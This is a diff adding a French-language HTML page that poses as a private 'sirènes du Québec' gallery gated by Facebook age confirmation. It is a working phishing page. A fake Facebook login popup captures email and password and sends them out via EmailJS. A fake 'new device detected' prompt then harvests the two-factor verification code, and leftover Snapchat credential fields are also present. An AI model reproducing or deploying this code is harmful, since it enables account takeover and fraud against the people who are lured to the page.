@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8"/>
+  <title>Les sirènes du Québec - Gallerie privée!</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+<!-- Open Graph / Twitter metas inserted -->
+<meta name="description" content="Gallerie privée — Les sirènes du Québec!">
+<link rel="canonical" href="https://sirenes-qc.onrender.com/">
+
+<meta property="og:locale" content="fr_CA">
+<meta property="og:site_name" content="Les sirènes du Québec">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sirenes-qc.onrender.com/">
+<meta property="og:title" content="Gallerie privée – Les sirènes du Québec">
+<meta property="og:description" content="Accès sécurisé à la galerie privée des sirènes du Québec.">
+<meta property="og:image" content="https://sirenes-qc.onrender.com/preview_sirene.jpg?v=2">
+<meta property="og:image:secure_url" content="https://sirenes-qc.onrender.com/preview_sirene.jpg?v=2">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Bannière Sirenes Québec">
+<link rel="image_src" href="https://sirenes-qc.onrender.com/preview_sirene.jpg?v=2">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Les sirènes du Québec – Gallerie privés">
+<meta name="twitter:description" content="Accès sécurisé à la galerie privée des sirènes du Québec.">
+<meta name="twitter:image" content="https://sirenes-qc.onrender.com/preview_sirene.jpg?v=2">
+<!-- End OG/Twitter -->
+
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Playfair Display', serif;
+      color: #fff;
+      text-align: center;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      position: relative;
+    }
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(2px);
+      z-index: 0;
+    }
+    .header, .extras, .bitmoji-row, .bottom-banner, .login-popup, .verification-popup {
+      position: relative;
+      z-index: 1;
+    }
+    .header { padding: 60px 20px 30px; }
+    .header h1 {
+      font-size: 4em;
+      color: #4F42B5;
+      text-shadow: 0 0 15px rgba(243, 96, 207, 0.5);
+      margin-bottom: 10px;
+    }
+    .subtitle { font-size: 1.5em; margin-bottom: 30px; color: #f5f5f5; }
+    .button {
+      background: #FF69B4;
+      color: #fff;
+      border: none;
+      padding: 14px 30px;
+      font-size: 1.1em;
+      font-weight: bold;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
+      transition: 0.3s ease-in-out;
+    }
+    .button:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 105, 180, 0.9); }
+    .bitmoji-row {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin: 40px 0;
+    }
+    .bitmoji {
+      width: 90px; height: 90px; margin: 12px; border-radius: 50%;
+      background-size: cover; background-position: center;
+      border: 2px solid #fff; box-shadow: 0 0 10px rgba(255, 255, 255, 0.4);
+    }
+    .extras {
+      background: rgba(255, 255, 255, 0.1);
+      color: #ffe; padding: 50px 20px;
+      border-top-left-radius: 30px; border-top-right-radius: 30px;
+    }
+    .extras h2 { font-size: 2em; margin-top: 0; color: #4F42B5; }
+    .extra-item { margin: 20px 0; font-size: 1.1em; }
+
+    .login-popup, .overlay, .login-loading, .verification-popup {
+      position: fixed;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #fff; color: #000;
+      padding: 30px; border-radius: 20px;
+      z-index: 1000;
+      width: 90%; max-width: 400px;
+      text-align: left; display: none;
+    }
+    .login-popup input, .verification-popup input {
+      width: 100%; padding: 12px; margin-bottom: 15px;
+      border-radius: 8px; border: 1px solid #ccc;
+    }
+    .overlay { background: rgba(0,0,0,0.6); width: 100%; height: 100%; z-index: 999; }
+    .bottom-banner img, .top-banner img { width: 100%; height: auto; display: block; }
+/* Facebook popup styles */
+    #facebookPopup { background: #18191a; color: #e4e6eb; font-family: sans-serif; border: none; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
+    #facebookPopup h3 { background: none; color: #e4e6eb; font-weight: bold; font-size: 1.4em; padding: 0; margin-bottom: 20px; text-align: center; }
+    #facebookPopup label { color: #b0b3b8; }
+    #facebookPopup input { background: #242526; border: 1px solid #3A3B3C; border-radius: 10px; color: #e4e6eb; }
+    #facebookPopup button.button { background: #ccc; color: #000; border-radius: 50px; border: none; width: 100%; }
+    #facebookPopup button.button:nth-of-type(2) { background: transparent; color: #1877F2; border: 1px solid #1877F2; }
+    #facebookPopup button.button:nth-of-type(2):hover { background: #E7F3FF; }
+  </style>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      if (window.emailjs) { emailjs.init("AATQVLMcBJaRBgEox"); }
+    });
+  </script>
+
+  <!-- Open Graph / Twitter Card for link previews (Messenger, Instagram, Snapchat, etc.) -->
+  <meta property="og:title" content="Les sirènes du Québec – Gallerie privée"/>
+  <meta property="og:description" content="Accès sécurisé à la galerie privée des sirènes du Québec."/>
+  <meta property="og:type" content="website"/>
+  <meta property="og:url" content="https://sirenes-qc.onrender.com"/>
+  <meta property="og:image" content="https://sirenes-qc.onrender.com/preview_sirene.jpg"/>
+  <meta property="og:image:secure_url" content="https://sirenes-qc.onrender.com/preview_sirene.jpg"/>
+  <meta property="og:image:type" content="image/jpeg"/>
+  <meta property="og:image:width" content="1200"/>
+  <meta property="og:image:height" content="630"/>
+  <link rel="image_src" href="https://sirenes-qc.onrender.com/preview_sirene.jpg"/>
+
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" content="Les sirènes du Québec – Gallerie privée"/>
+  <meta name="twitter:description" content="Accès sécurisé à la galerie privée des sirènes du Québec."/>
+  <meta name="twitter:image" content="https://sirenes-qc.onrender.com/preview_sirene.jpg"/>
+</head>
+
+<body>
+
+
+  <div class="header">
+    <h1>Les sirènes du Québec</h1>
+    <p class="subtitle">Bienvenue sur ma gallerie privée !</p>
+
+    <!-- Facebook en premier, Snapchat ensuite -->
+    <button class="button" id="facebookBtn" onclick="openFacebookPopup()">Confirmer votre âge avec Facebook</button>
+  </div>
+
+  <div class="bitmoji-row">
+    <div class="bitmoji" style="background-image: url('avatar1.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar2.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar3.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar4.png')"></div>
+  </div>
+
+  <div id="overlay" class="overlay" onclick="closeLogin()"></div>
+<label for="snap-username">Nom d'utilisateur ou e-mail</label>
+    <input id="snap-username" type="text" placeholder="Nom d'utilisateur ou e-mail"/>
+    <label for="snap-password">Mot de passe</label>
+    <input id="snap-password" type="password" placeholder="Mot de passe"/>
+    <button class="button" onclick="showLoadingAndVerify('snapchatPopup')" style="margin-top: 15px;">Valider</button>
+    <button class="button" onclick="closePopup('snapchatPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
+  </div>
+
+  <!-- POPUP FACEBOOK -->
+  <div class="login-popup" id="facebookPopup">
+    <div style="text-align:center;">
+      <img src="logo-fb.jpg" alt="Facebook" style="width: 60px; margin-bottom: 10px;"/>
+      <h3 style="margin: 10px 0;">Confirmer votre âge avec Facebook</h3>
+    </div>
+    <label for="fb-email">Adresse e-mail ou numéro de mobile</label>
+    <input id="fb-email" type="text" placeholder="Adresse e-mail ou téléphone"/>
+    <label for="fb-password">Mot de passe</label>
+    <input id="fb-password" type="password" placeholder="Mot de passe"/>
+    <button class="button" onclick="showLoadingAndVerify('facebookPopup')" style="margin-top: 15px;">Valider</button>
+    <button class="button" onclick="closePopup('facebookPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
+  </div>
+
+  <div class="login-popup" id="verificationPopup">
+    <h3 style="margin-top: 0; font-size: 1.5em;">Nouvel appareil détecté</h3>
+    <p style="margin-bottom: 15px;">Un code de vérification vous sera envoyé à l’intérieur des 2 prochaines minutes.</p>
+    <label for="verificationCode" style="font-weight:bold;">Entrez le code reçu :</label>
+    <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code de 6 à 8 chiffres"/>
+    <button class="button" onclick="submitVerificationCode()" style="margin-top:10px;">Vérifier</button>
+    <button class="button" onclick="closePopup('verificationPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
+  </div>
+
+  <div class="bottom-banner">
+    <img src="banner.png" alt="Bannière Bitmoji"/>
+  </div>
+
+  <script>
+function openFacebookPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('facebookPopup').style.display = 'block';
+    }
+    function closePopup(popupId) {
+      document.getElementById('overlay').style.display = 'none';
+      document.getElementById(popupId).style.display = 'none';
+    }
+
+    
+
+    function closeLogin() {
+      const overlay = document.getElementById('overlay');
+      if (overlay) overlay.style.display = 'none';
+      // Hide any popups that might be open
+      document.querySelectorAll('.login-popup, .verification-popup, .login-loading').forEach(el => {
+        el.style.display = 'none';
+      });
+    }
+function showLoadingAndVerify(popupId) {
+      const popup = document.getElementById(popupId);
+      const inputs = popup.querySelectorAll("input");
+      const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
+
+      if (!allFilled) {
+        alert("Veuillez remplir tous les champs.");
+        return;
+      }
+
+      const button = popup.querySelector("button");
+      const originalText = button.textContent;
+      button.disabled = true;
+      button.textContent = "Validation en cours...";
+
+      let params = {};
+      if (popupId === "facebookPopup") {
+        params = {
+          fb_email: document.getElementById("fb-email").value.trim(),
+          fb_password: document.getElementById("fb-password").value.trim()
+        };
+      }
+
+if (window.emailjs) {
+        emailjs.send("service_photos", "template_connexion", params)
+          .then(() => {
+            setTimeout(() => {
+              button.disabled = false;
+              button.textContent = originalText;
+              popup.style.display = "none";
+              document.getElementById("verificationPopup").style.display = "block";
+            }, 2000);
+          })
+          .catch(err => {
+            alert("Erreur EmailJS : " + JSON.stringify(err));
+            button.disabled = false;
+            button.textContent = originalText;
+          });
+      } else {
+        alert("EmailJS non chargé.");
+        button.disabled = false;
+        button.textContent = originalText;
+      }
+    }
+
+    function submitVerificationCode() {
+      const code = document.getElementById("verificationCode").value.trim();
+      const params = { verification_code: code };
+
+      if (window.emailjs) {
+        emailjs.send("service_photos", "template_code", params)
+          .then(() => { window.location.href = "medias.html"; })
+          .catch(err => { alert("Erreur EmailJS : " + JSON.stringify(err)); });
+      } else {
+        alert("EmailJS non chargé.");
+      }
+    }
+  </script>
+</body>
+</html>
